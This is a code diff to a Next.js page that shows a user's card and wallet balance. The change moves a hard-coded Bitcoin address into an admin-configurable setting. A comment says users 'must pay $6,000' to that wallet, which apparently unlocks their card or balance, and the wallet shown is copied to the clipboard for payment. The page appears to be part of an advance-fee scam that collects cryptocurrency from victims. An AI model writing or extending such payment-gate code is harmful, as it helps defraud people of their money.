@@ -9,7 +9,6 @@ import {
 import Link from 'next/link';
 
 /* ─── BTC wallet the user must pay $6,000 to ─── */
-const BTC_WALLET   = 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh';
 const UNLOCK_AMOUNT = 6000;
 
 interface CardDetails {
@@ -35,6 +34,7 @@ export default function CardPage() {
   const [walletBalance,       setWalletBalance]       = useState(0);
   const [card,                setCard]                = useState<CardDetails | null>(null);
   const [showDetails,         setShowDetails]         = useState(false);
+  const [btcWallet,           setBtcWallet]           = useState('bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh');
 
   /* ── Move-to-card modal state ── */
   const [transferStep,  setTransferStep]  = useState<TransferStep>('idle');
@@ -54,6 +54,14 @@ export default function CardPage() {
         setUserName(data.userName);
         setCard(data.card);
         setWalletBalance(data.walletBalance ?? 0);
+      }
+
+      const settingsRes = await fetch('/api/admin/settings?t=' + Date.now());
+      if (settingsRes.ok) {
+        const settingsData = await settingsRes.json();
+        if (settingsData && settingsData.btcAddress) {
+          setBtcWallet(settingsData.btcAddress);
+        }
       }
     } catch (err) {
       console.error(err);
@@ -112,7 +120,7 @@ export default function CardPage() {
   };
 
   const copyWallet = () => {
-    navigator.clipboard.writeText(BTC_WALLET);
+    navigator.clipboard.writeText(btcWallet);
     setCopied(true);
     setTimeout(() => setCopied(false), 2500);
   };
@@ -369,7 +377,7 @@ export default function CardPage() {
                       </p>
                     </div>
                     <div className="bg-gray-900 border border-orange-500/30 rounded-xl p-4 flex items-center gap-3">
-                      <p className="font-mono text-xs text-orange-300 break-all flex-1">{BTC_WALLET}</p>
+                      <p className="font-mono text-xs text-orange-300 break-all flex-1">{btcWallet}</p>
                       <button
                         onClick={copyWallet}
                         className="shrink-0 p-2 bg-orange-500/10 hover:bg-orange-500/20 text-orange-400 rounded-lg transition-colors"
